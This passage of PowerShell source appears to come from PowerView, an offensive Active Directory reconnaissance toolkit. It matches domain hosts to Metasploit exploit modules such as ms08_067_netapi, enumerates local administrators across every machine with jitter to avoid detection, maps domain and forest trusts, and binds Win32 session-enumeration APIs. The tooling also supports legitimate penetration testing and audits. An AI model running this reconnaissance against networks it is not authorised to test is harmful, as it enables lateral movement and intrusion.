        $TableExploits.Rows.Add("Windows XP","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  

        # Status user        
        Write-Verbose "[*] Checking computers for vulnerable OS and SP levels..."

        # ----------------------------------------------------------------
        # Setup data table to store vulnerable systems
        # ----------------------------------------------------------------

        # Create data table to house vulnerable server list
        $TableVulnComputers = New-Object System.Data.DataTable 
        $TableVulnComputers.Columns.Add('ComputerName') | Out-Null
        $TableVulnComputers.Columns.Add('OperatingSystem') | Out-Null
        $TableVulnComputers.Columns.Add('ServicePack') | Out-Null
        $TableVulnComputers.Columns.Add('LastLogon') | Out-Null
        $TableVulnComputers.Columns.Add('MsfModule') | Out-Null  
        $TableVulnComputers.Columns.Add('CVE') | Out-Null   
        
        # Iterate through each exploit
        $TableExploits | 
        ForEach-Object {
                     
            $ExploitOS = $_.OperatingSystem
            $ExploitSP = $_.ServicePack
            $ExploitMsf = $_.MsfModule
            $ExploitCve = $_.CVE

            # Iterate through each ADS computer
            $TableAdsComputers | 
            ForEach-Object {
                
                $AdsHostname = $_.Hostname
                $AdsOS = $_.OperatingSystem
                $AdsSP = $_.ServicePack                                                        
                $AdsLast = $_.LastLogon
                
                # Add exploitable systems to vul computers data table
                if ($AdsOS -like "$ExploitOS*" -and $AdsSP -like "$ExploitSP" ){                    
                    # Add domain computer to data table                    
                    $TableVulnComputers.Rows.Add($AdsHostname,$AdsOS,$AdsSP,[dateTime]::FromFileTime($AdsLast),$ExploitMsf,$ExploitCve) | Out-Null 
                }
            }
        }     
        
        # Display results
        $VulnComputer = $TableVulnComputers | select ComputerName -Unique | measure
        $vulnComputerCount = $VulnComputer.Count
        If ($VulnComputer.Count -gt 0){
            # Return vulnerable server list order with some hack date casting
            Write-Verbose "[+] Found $vulnComputerCount potentially vulnerabile systems!"
            $TableVulnComputers | Sort-Object { $_.lastlogon -as [datetime]} -Descending

        }else{
            Write-Verbose "[-] No vulnerable systems were found."
        }
    }
    End
    {
    }
}


function Invoke-EnumerateLocalAdmin {
    <#
        .SYNOPSIS
        Enumerates members of the local Administrators groups
        across all machines in the domain.

        Author: @harmj0y
        License: BSD 3-Clause

        .DESCRIPTION
        This function queries the domain for all active machines with
        Get-NetComputer, then for each server it queries the local
        Administrators with Get-NetLocalGroup.

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER Delay
        Delay between enumerating hosts, defaults to 0.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Jitter
        Jitter for the host delay, defaults to +/- 0.3.

        .PARAMETER OutFile
        Output results to a specified csv output file.

        .PARAMETER TrustGroups
        Only return results that are not part of the local machine
        or the machine's domain. Old Invoke-EnumerateLocalTrustGroup
        functionality.

        .PARAMETER Domain
        Domain to query for systems.

        .LINK
        http://blog.harmj0y.net/
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [String]
        $HostList,

        [String]
        $HostFilter,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [double]
        $Jitter = .3,

        [String]
        $OutFile,

        [Switch]
        $TrustGroups,

        [String]
        $Domain
    )

    begin {

        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # get the target domain
        if($Domain){
            $targetDomain = $Domain
        }
        else{
            # use the local domain
            $targetDomain = $null
        }

        Write-Verbose "[*] Running Invoke-EnumerateLocalAdmin with delay of $Delay"
        if($targetDomain){
            Write-Verbose "[*] Domain: $targetDomain"
        }

        # random object for delay
        $randNo = New-Object System.Random

        # if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                return
            }
        }
        elseif($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
            $Hosts = Get-NetComputer -Domain $targetDomain -HostName $HostFilter
        }

        # delete any existing output file if it already exists
        if ($OutFile -and (Test-Path -Path $OutFile)){ Remove-Item -Path $OutFile }


        if($TrustGroups){
            
            Write-Verbose "Determining domain trust groups"

            # find all group names that have one or more users in another domain
            $TrustGroupNames = Find-GroupTrustUser -Domain $domain | % { $_.GroupName } | Sort-Object -Unique

            $TrustGroupsSIDS = $TrustGroupNames | % { 
                # ignore the builtin administrators group for a DC
                Get-NetGroup -Domain $Domain -GroupName $_ -FullData | ? { $_.objectsid -notmatch "S-1-5-32-544" } | % { $_.objectsid }
            }

            # query for the primary domain controller so we can extract the domain SID for filtering
            $PrimaryDC = (Get-NetDomain -Domain $Domain).PdcRoleOwner
            $PrimaryDCSID = (Get-NetComputer -Domain $Domain -Hostname $PrimaryDC -FullData).objectsid
            $parts = $PrimaryDCSID.split("-")
            $DomainSID = $parts[0..($parts.length -2)] -join "-"
        }
    }

    process{

        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $targetDomain for hosts..."
            $Hosts = Get-NetComputer -Domain $targetDomain
        }

        # randomize the host list
        $Hosts = Get-ShuffledArray $Hosts

        if(-not $NoPing){
            $Hosts = $Hosts | Invoke-Ping
        }

        $counter = 0

        foreach ($server in $Hosts){

            $counter = $counter + 1

            Write-Verbose "[*] Enumerating server $server ($counter of $($Hosts.count))"

            # sleep for our semi-randomized interval
            Start-Sleep -Seconds $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

            # grab the users for the local admins on this server
            $LocalAdmins = Get-NetLocalGroup -HostName $server

            # if we just want to return cross-trust users
            if($TrustGroups) {
                # get the local machine SID
                $LocalSID = ($LocalAdmins | Where-Object { $_.SID -match '.*-500$' }).SID -replace "-500$"

                # filter out accounts that begin with the machine SID and domain SID
                #   but preserve any groups that have users across a trust ($TrustGroupSIDS)
                $LocalAdmins = $LocalAdmins | Where-Object { ($TrustGroupsSIDS -contains $_.SID) -or ((-not $_.SID.startsWith($LocalSID)) -and (-not $_.SID.startsWith($DomainSID))) }
            }

            if($LocalAdmins -and ($LocalAdmins.Length -ne 0)){
                # output the results to a csv if specified
                if($OutFile){
                    $LocalAdmins | Export-Csv -Append -notypeinformation -path $OutFile
                }
                else{
                    # otherwise return the user objects
                    $LocalAdmins
                }
            }
            else{
                Write-Verbose "[!] No users returned from $server"
            }
        }
    }
}


function Invoke-EnumerateLocalAdminThreaded {
    <#
        .SYNOPSIS
        Enumerates members of the local Administrators groups
        across all machines in the domain. Uses multithreading to
        speed up enumeration.

        Author: @harmj0y
        License: BSD 3-Clause

        .DESCRIPTION
        This function queries the domain for all active machines with
        Get-NetComputer, then for each server it queries the local
        Administrators with Get-NetLocalGroup.

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER TrustGroups
        Only return results that are not part of the local machine
        or the machine's domain. Old Invoke-EnumerateLocalTrustGroup
        functionality.

        .PARAMETER Domain
        Domain to query for systems.

        .PARAMETER OutFile
        Output results to a specified csv output file.

        .PARAMETER MaxThreads
        The maximum concurrent threads to execute.

        .LINK
        http://blog.harmj0y.net/
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [String]
        $HostList,

        [String]
        $HostFilter,

        [Switch]
        $NoPing,

        [Switch]
        $TrustGroups,

        [String]
        $Domain,

        [String]
        $OutFile,

        [Int]
        $MaxThreads = 20
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # get the target domain
        if($Domain){
            $targetDomain = $Domain
        }
        else{
            # use the local domain
            $targetDomain = $null
        }

        Write-Verbose "[*] Running Invoke-EnumerateLocalAdminThreaded with delay of $Delay"
        if($targetDomain){
            Write-Verbose "[*] Domain: $targetDomain"
        }

        # if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                "[!] Input file '$HostList' doesn't exist!"
                return
            }
        }
        elseif($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
            $Hosts = Get-NetComputer -Domain $targetDomain -HostName $HostFilter
        }

        $DomainSID = $Null
        $TrustGroupsSIDS = $Null

        if($TrustGroups) {
            # find all group names that have one or more users in another domain
            $TrustGroupNames = Find-GroupTrustUser -Domain $domain | % { $_.GroupName } | Sort-Object -Unique

            $TrustGroupsSIDS = $TrustGroupNames | % { 
                # ignore the builtin administrators group for a DC
                Get-NetGroup -Domain $Domain -GroupName $_ -FullData | ? { $_.objectsid -notmatch "S-1-5-32-544" } | % { $_.objectsid }
            }

            # query for the primary domain controller so we can extract the domain SID for filtering
            $PrimaryDC = (Get-NetDomain -Domain $Domain).PdcRoleOwner
            $PrimaryDCSID = (Get-NetComputer -Domain $Domain -Hostname $PrimaryDC -FullData).objectsid
            $parts = $PrimaryDCSID.split("-")
            $DomainSID = $parts[0..($parts.length -2)] -join "-"
        }

        # script block that eunmerates a server
        # this is called by the multi-threading code later
        $EnumServerBlock = {
            param($Server, $Ping, $OutFile, $DomainSID, $TrustGroupsSIDS)

            # optionally check if the server is up first
            $up = $true
            if($Ping){
                $up = Test-Server -Server $Server
            }
            if($up){
                # grab the users for the local admins on this server
                $LocalAdmins = Get-NetLocalGroup -HostName $server

                # if we just want to return cross-trust users
                if($DomainSID -and $TrustGroupSIDS) {
                    # get the local machine SID
                    $LocalSID = ($localAdmins | Where-Object { $_.SID -match '.*-500$' }).SID -replace "-500$"

                    # filter out accounts that begin with the machine SID and domain SID
                    #   but preserve any groups that have users across a trust ($TrustGroupSIDS)
                    $LocalAdmins = $LocalAdmins | Where-Object { ($TrustGroupsSIDS -contains $_.SID) -or ((-not $_.SID.startsWith($LocalSID)) -and (-not $_.SID.startsWith($DomainSID))) }
                }

                if($LocalAdmins -and ($LocalAdmins.Length -ne 0)){
                    # output the results to a csv if specified
                    if($OutFile){
                        $LocalAdmins | export-csv -Append -notypeinformation -path $OutFile
                    }
                    else{
                        # otherwise return the user objects
                        $LocalAdmins
                    }
                }
                else{
                    Write-Verbose "[!] No users returned from $server"
                }
            }
        }

        # Adapted from:
        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
        $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $sessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()

        # grab all the current variables for this runspace
        $MyVars = Get-Variable -Scope 1

        # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
        $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")

        # Add Variables from Parent Scope (current runspace) into the InitialSessionState
        ForEach($Var in $MyVars) {
            If($VorbiddenVars -notcontains $Var.Name) {
            $sessionstate.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
            }
        }

        # Add Functions from current runspace to the InitialSessionState
        ForEach($Function in (Get-ChildItem Function:)) {
            $sessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
        }

        # threading adapted from
        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
        # Thanks Carlos!
        $counter = 0

        # create a pool of maxThread runspaces
        $pool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $sessionState, $host)
        $pool.Open()

        $jobs = @()
        $ps = @()
        $wait = @()

        $counter = 0
    }

    process {

        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $targetDomain for hosts..."
            $Hosts = Get-NetComputer -Domain $targetDomain
        }

        # randomize the host list
        $Hosts = Get-ShuffledArray $Hosts
        $HostCount = $Hosts.Count
        Write-Verbose "[*] Total number of hosts: $HostCount"

        foreach ($server in $Hosts){
            # make sure we get a server name
            if ($server -ne ''){
                Write-Verbose "[*] Enumerating server $server ($($counter+1) of $($Hosts.count))"

                While ($($pool.GetAvailableRunspaces()) -le 0) {
                    Start-Sleep -milliseconds 500
                }

                # create a "powershell pipeline runner"
                $ps += [powershell]::create()

                $ps[$counter].runspacepool = $pool

                # add the script block + arguments
                [void]$ps[$counter].AddScript($EnumServerBlock).AddParameter('Server', $server).AddParameter('Ping', -not $NoPing).AddParameter('OutFile', $OutFile).AddParameter('DomainSID', $DomainSID).AddParameter('TrustGroupsSIDS', $TrustGroupsSIDS)

                # start job
                $jobs += $ps[$counter].BeginInvoke();

                # store wait handles for WaitForAll call
                $wait += $jobs[$counter].AsyncWaitHandle
            }
            $counter = $counter + 1
        }
    }

    end {

        Write-Verbose "Waiting for scanning threads to finish..."

        $waitTimeout = Get-Date

        while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $waitTimeout).totalSeconds) -gt 60) {
                Start-Sleep -milliseconds 500
            }

        # end async call
        for ($y = 0; $y -lt $counter; $y++) {

            try {
                # complete async job
                $ps[$y].EndInvoke($jobs[$y])

            } catch {
                Write-Warning "error: $_"
            }
            finally {
                $ps[$y].Dispose()
            }
        }
        $pool.Dispose()
    }
}


########################################################
#
# Domain trust functions below.
#
########################################################

function Get-NetDomainTrust {
    <#
        .SYNOPSIS
        Return all domain trusts for the current domain or
        a specified domain.

        .PARAMETER Domain
        The domain whose trusts to enumerate. If not given,
        uses the current domain.

        .PARAMETER DomainController
        Domain controller to reflect queries through.

        .PARAMETER LDAP
        Use LDAP queries to enumerate the trusts instead of direct domain connections.
        More likely to get around network segmentation, but not as accurate.

        .EXAMPLE
        > Get-NetDomainTrust
        Return domain trusts for the current domain.

        .EXAMPLE
        > Get-NetDomainTrust -Domain "test"
        Return domain trusts for the "test" domain.
    #>

    [CmdletBinding()]
    param(
        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $LDAP
    )

    if($LDAP) {

        $TrustSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController

        if($TrustSearcher) {
            if(!$Domain){
                $Domain = (Get-NetDomain).Name
            }

            $TrustSearcher.filter = '(&(objectClass=trustedDomain))'
            $TrustSearcher.PageSize = 200

            $TrustSearcher.FindAll() | ForEach-Object {
                $Props = $_.Properties
                $out = New-Object psobject
                $attrib = Switch ($props.trustattributes)
                {
                    0x001 { "non_transitive" }
                    0x002 { "uplevel_only" }
                    0x004 { "quarantined_domain" }
                    0x008 { "forest_transitive" }
                    0x010 { "cross_organization" }
                    0x020 { "within_forest" }
                    0x040 { "treat_as_external" }
                    0x080 { "trust_uses_rc4_encryption" }
                    0x100 { "trust_uses_aes_keys" }
                    Default { 
                        write-warning "Unknown trust attribute: $($props.trustattributes)";
                        "$($props.trustattributes)";
                    }
                }
                $direction = Switch ($props.trustdirection){
                    0 { "Disabled" }
                    1 { "Inbound" }
                    2 { "Outbound" }
                    3 { "Bidirectional" }
                }
                $objectguid = New-Object Guid @(,$Props.objectguid[0])
                $out | Add-Member Noteproperty 'SourceName' $Domain
                $out | Add-Member Noteproperty 'TargetName' $Props.name[0]
                $out | Add-Member Noteproperty 'ObjectGuid' "{$objectguid}"
                $out | Add-Member Noteproperty 'TrustType' "$attrib"
                $out | Add-Member Noteproperty 'TrustDirection' "$direction"
                $out
            }
        }
    }

    else {
        # if we're using direct domain connections
        $d = Get-NetDomain -Domain $Domain
        if($d){
            $d.GetAllTrustRelationships()
        }
    }
}


function Get-NetForestTrust {
    <#
        .SYNOPSIS
        Return all trusts for the current forest.

        .PARAMETER Forest
        Return trusts for the specified forest.

        .EXAMPLE
        > Get-NetForestTrust
        Return current forest trusts.

        .EXAMPLE
        > Get-NetForestTrust -Forest "test"
        Return trusts for the "test" forest.
    #>

    [CmdletBinding()]
    param(
        [String]
        $Forest
    )

    $f = (Get-NetForest -Forest $Forest)
    if($f){
        $f.GetAllTrustRelationships()
    }
}


function Find-UserTrustGroup {
    <#
        .SYNOPSIS
        Enumerates users who are in groups outside of their
        principal domain. The -Recurse option will try to map all 
        transitive domain trust relationships and enumerate all 
        users who are in groups outside of their principal domain.

        .PARAMETER UserName
        Username to filter results for, wildcards accepted.

        .PARAMETER Domain
        Domain to query for users.

        .PARAMETER Recurse
        Enumerate all user trust groups from all reachable domains recursively.

        .LINK
        http://blog.harmj0y.net/
    #>

    [CmdletBinding()]
    param(
        [String]
        $UserName,

        [String]
        $Domain,

        [Switch]
        $Recurse
    )


    function Get-UserTrustGroup {
        param(
            [String]
            $UserName,

            [String]
            $Domain
        )

        if ($Domain){
            # get the domain name into distinguished form
            $DistinguishedDomainName = "DC=" + $Domain -replace '\.',',DC='
        }
        else {
            $DistinguishedDomainName = [String] ([adsi]'').distinguishedname
            $Domain = $DistinguishedDomainName -replace 'DC=','' -replace ',','.'
        }

        Get-NetUser -Domain $Domain -UserName $UserName | ? {$_.memberof} | % {
            foreach ($membership in $_.memberof) {
                $index = $membership.IndexOf("DC=")
                if($index) {
                    
                    $GroupDomain = $($membership.substring($index)) -replace 'DC=','' -replace ',','.'
                    
                    if ($GroupDomain.CompareTo($Domain)) {

                        $GroupName = $membership.split(",")[0].split("=")[1]
                        $out = new-object psobject
                        $out | Add-Member Noteproperty 'UserDomain' $Domain
                        $out | Add-Member Noteproperty 'UserName' $_.samaccountname
                        $out | Add-Member Noteproperty 'GroupDomain' $GroupDomain
                        $out | Add-Member Noteproperty 'GroupName' $GroupName
                        $out | Add-Member Noteproperty 'GroupDN' $membership
                        $out
                    }
                }
            }
        }
    }

    if (-not $Recurse ){
        Get-UserTrustGroup -Domain $Domain -UserName $UserName
    }
    else {

        # keep track of domains seen so we don't hit infinite recursion
        $seenDomains = @{}

        # our domain status tracker
        $domains = New-Object System.Collections.Stack

        # get the current domain and push it onto the stack
        $currentDomain = (([adsi]'').distinguishedname -replace 'DC=','' -replace ',','.')[0]
        $domains.push($currentDomain)

        while($domains.Count -ne 0){

            $d = $domains.Pop()

            # if we haven't seen this domain before
            if (-not $seenDomains.ContainsKey($d)) {

                Write-Verbose "Enumerating domain $d"

                # mark it as seen in our list
                $seenDomains.add($d, "") | out-null

                # get the trust groups for this domain
                if ($UserName){
                    Get-UserTrustGroup -Domain $d -UserName $UserName

                }
                else{
                    Get-UserTrustGroup -Domain $d
                }

                try{
                    # get all the trusts for this domain
                    $trusts = Get-NetDomainTrust -Domain $d
                    if ($trusts){

                        # enumerate each trust found
                        foreach ($trust in $trusts){
                            $target = $trust.TargetName
                            # make sure we process the target
                            $domains.push($target) | out-null
                        }
                    }
                }
                catch{
                    Write-Warning "[!] Error: $_"
                }
            }
        }
    }
}


function Find-GroupTrustUser {
    <#
        .SYNOPSIS
        Enumerates all the members of a given domain's groups
        and finds users that are not in the queried domain.
        The -Recurse flag will perform this enumeration for all
        eachable domain trusts.

        .PARAMETER GroupName
        Groupname to filter results for, wildcards accepted.

        .PARAMETER Domain
        Domain to query for groups.

        .PARAMETER Recurse
        Enumerate all group trust users from all reachable domains recursively.

        .LINK
        http://blog.harmj0y.net/
    #>

    [CmdletBinding()]
    param(
        [String]
        $GroupName,

        [String]
        $Domain,

        [Switch]
        $Recurse
    )

    function Get-GroupTrustUser {
        param(
            [String]
            $GroupName,

            [String]
            $Domain
        )

        if(-not $Domain){
            $Domain = (Get-NetDomain).Name
        }

        $DomainDN = "DC=$($Domain.Replace('.', ',DC='))"
        Write-Verbose "DomainDN: $DomainDN"

        # standard group names to ignore
        $ExcludeGroups = @("Users", "Domain Users", "Guests")

        # get all the groupnames for the given domain
        Get-NetGroup -GroupName $GroupName -Domain $Domain -FullData | ? {$_.member} | ? {
            # exclude common large groups
            -not ($ExcludeGroups -contains $_.samaccountname) } | % {
                
                $GroupName = $_.samAccountName

                $_.member | % {
                    # filter for foreign SIDs in the cn field for users in another domain,
                    #   or if the DN doesn't end with the proper DN for the queried domain  
                    if (($_ -match 'CN=S-1-5-21.*-.*') -or ($DomainDN -ne ($_.substring($_.IndexOf("DC="))))) {

                        $UserDomain = $_.subString($_.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'
                        $UserName = $_.split(",")[0].split("=")[1]

                        $out = new-object psobject
                        $out | Add-Member Noteproperty 'GroupDomain' $Domain
                        $out | Add-Member Noteproperty 'GroupName' $GroupName
                        $out | Add-Member Noteproperty 'UserDomain' $UserDomain
                        $out | Add-Member Noteproperty 'UserName' $UserName
                        $out | Add-Member Noteproperty 'UserDN' $_
                        $out
                    }
                }
        }
    }

    if (-not $Recurse ){
        Get-GroupTrustUser -Domain $Domain -GroupName $GroupName
    }
    else {
        # keep track of domains seen so we don't hit infinite recursion
        $seenDomains = @{}

        # our domain status tracker
        $domains = New-Object System.Collections.Stack

        # get the current domain and push it onto the stack
        $currentDomain = (([adsi]'').distinguishedname -replace 'DC=','' -replace ',','.')[0]
        $domains.push($currentDomain)

        while($domains.Count -ne 0){

            $d = $domains.Pop()

            # if we haven't seen this domain before
            if (-not $seenDomains.ContainsKey($d)) {

                Write-Verbose "Enumerating domain $d"

                # mark it as seen in our list
                $seenDomains.add($d, "") | out-null

                # get the group trust user for this domain
                Get-GroupTrustUser -Domain $d

                try{
                    # get all the trusts for this domain
                    $trusts = Get-NetDomainTrust -Domain $d
                    if ($trusts){

                        # enumerate each trust found
                        foreach ($trust in $trusts){
                            $target = $trust.TargetName
                            # make sure we process the target
                            $domains.push($target) | out-null
                        }
                    }
                }
                catch{
                    Write-Warning "[!] Error: $_"
                }
            }
        }
    }
}


function Invoke-MapDomainTrust {
    <#
        .SYNOPSIS
        Try to map all transitive domain trust relationships.

        .DESCRIPTION
        This function gets all trusts for the current domain,
        and tries to get all trusts for each domain it finds.

        .PARAMETER LDAP
        Use LDAP queries to enumerate the trusts instead of direct domain connections.
        More likely to get around network segmentation, but not as accurate.

        .EXAMPLE
        > Invoke-MapDomainTrust | Export-CSV -NoTypeInformation trusts.csv
        Map all reachable domain trusts and output everything to a .csv file.

        .LINK
        http://blog.harmj0y.net/
    #>
    [CmdletBinding()]
    param(
        [Switch]
        $LDAP
    )

    # keep track of domains seen so we don't hit infinite recursion
    $seenDomains = @{}

    # our domain status tracker
    $domains = New-Object System.Collections.Stack

    # get the current domain and push it onto the stack
    $currentDomain = (Get-NetDomain).Name
    $domains.push($currentDomain)

    while($domains.Count -ne 0){

        $d = $domains.Pop()

        # if we haven't seen this domain before
        if (-not $seenDomains.ContainsKey($d)) {

            # mark it as seen in our list
            $seenDomains.add($d, "") | out-null

            try{
                # get all the trusts for this domain
                if($LDAP){
                    $trusts = Get-NetDomainTrust -Domain $d -LDAP
                }
                else {
                    $trusts = Get-NetDomainTrust -Domain $d
                }

                if ($trusts){

                    # enumerate each trust found
                    foreach ($trust in $trusts){
                        $source = $trust.SourceName
                        $target = $trust.TargetName
                        $type = $trust.TrustType
                        $direction = $trust.TrustDirection

                        # make sure we process the target
                        $domains.push($target) | out-null

                        # build the nicely-parsable custom output object
                        $out = new-object psobject
                        $out | Add-Member Noteproperty 'SourceDomain' $source
                        $out | Add-Member Noteproperty 'TargetDomain' $target
                        $out | Add-Member Noteproperty 'TrustType' "$type"
                        $out | Add-Member Noteproperty 'TrustDirection' "$direction"
                        $out
                    }
                }
            }
            catch{
                Write-Warning "[!] Error: $_"
            }
        }
    }
}


########################################################
#
# Expose the Win32API functions and datastructures below
# using PSReflect. 
# Warning: Once these are executed, they are baked in 
# and can't be changed while the script is running!
#
########################################################

$Mod = New-InMemoryModule -ModuleName Win32

# all of the Win32 API functions we need
$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int])),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(),  [Int32].MakeByRefType())),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType())),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func kernel32 GetLastError ([Int]) @())
)

# enum used by $WTS_SESSION_INFO_1 below
$WTSConnectState = psenum $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}

# the WTSEnumerateSessionsEx result structure
$WTS_SESSION_INFO_1 = struct $Mod WTS_SESSION_INFO_1 @{
    ExecEnvId = field 0 UInt32
    State = field 1 $WTSConnectState
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @('LPWStr')
    pHostName = field 4 String -MarshalAs @('LPWStr')
    pUserName = field 5 String -MarshalAs @('LPWStr')
    pDomainName = field 6 String -MarshalAs @('LPWStr')
    pFarmName = field 7 String -MarshalAs @('LPWStr')
}

# the particular WTSQuerySessionInformation result structure
$WTS_CLIENT_ADDRESS = struct $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
}

# the NetShareEnum result structure
$SHARE_INFO_1 = struct $Mod SHARE_INFO_1 @{
    shi1_netname = field 0 String -MarshalAs @('LPWStr')
    shi1_type = field 1 UInt32
    shi1_remark = field 2 String -MarshalAs @('LPWStr')
}

# the NetWkstaUserEnum result structure
$WKSTA_USER_INFO_1 = struct $Mod WKSTA_USER_INFO_1 @{
    wkui1_username = field 0 String -MarshalAs @('LPWStr')
    wkui1_logon_domain = field 1 String -MarshalAs @('LPWStr')
    wkui1_oth_domains = field 2 String -MarshalAs @('LPWStr')
    wkui1_logon_server = field 3 String -MarshalAs @('LPWStr')
}

# the NetSessionEnum result structure
$SESSION_INFO_10 = struct $Mod SESSION_INFO_10 @{
    sesi10_cname = field 0 String -MarshalAs @('LPWStr')
    sesi10_username = field 1 String -MarshalAs @('LPWStr')
    sesi10_time = field 2 UInt32
    sesi10_idle_time = field 3 UInt32
}


$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Netapi32 = $Types['netapi32']
$Advapi32 = $Types['advapi32']
$Kernel32 = $Types['kernel32']
$Wtsapi32 = $Types['wtsapi32']

# aliases to help the 2.0 transition
Set-Alias Get-NetForestDomains Get-NetForestDomain
Set-Alias Get-NetDomainControllers Get-NetDomainController
Set-Alias Get-NetUserSPNs Get-NetUser
Set-Alias Invoke-NetUserAdd Add-NetUser
Set-Alias Invoke-NetGroupUserAdd Add-NetGroupUser
Set-Alias Get-NetComputers Get-NetComputer
Set-Alias Get-NetOUs Get-NetOU
Set-Alias Get-NetGUIDOUs Get-NetOU
Set-Alias Get-NetFileServers Get-NetFileServer
Set-Alias Get-NetSessions Get-NetSession
Set-Alias Get-NetRDPSessions Get-NetRDPSession
Set-Alias Get-NetProcesses Get-NetProcess
Set-Alias Get-UserLogonEvents Get-UserEvent
Set-Alias Get-UserTGTEvents Get-UserEvent
Set-Alias Get-UserProperties Get-UserProperty
Set-Alias Get-ComputerProperties Get-ComputerProperty
Set-Alias Invoke-SearchFiles Invoke-FileSearch
Set-Alias Invoke-UserFieldSearch Find-UserField
Set-Alias Invoke-ComputerFieldSearch Find-ComputerField
Set-Alias Invoke-FindLocalAdminAccess Find-LocalAdminAccess
Set-Alias Invoke-FindLocalAdminAccessThreaded Find-LocalAdminAccessThreaded
Set-Alias Get-NetDomainTrusts Get-NetDomainTrust
Set-Alias Get-NetForestTrusts Get-NetForestTrust
Set-Alias Invoke-MapDomainTrusts Invoke-MapDomainTrust
Set-Alias Invoke-FindUserTrustGroups Find-UserTrustGroup
Set-Alias Invoke-FindGroupTrustUsers Find-GroupTrustUser
Set-Alias Invoke-EnumerateLocalTrustGroups Invoke-EnumerateLocalAdmin
Set-Alias Invoke-EnumerateLocalAdmins Invoke-EnumerateLocalAdmin
Set-Alias Invoke-EnumerateLocalAdminsThreaded Invoke-EnumerateLocalAdminThreaded
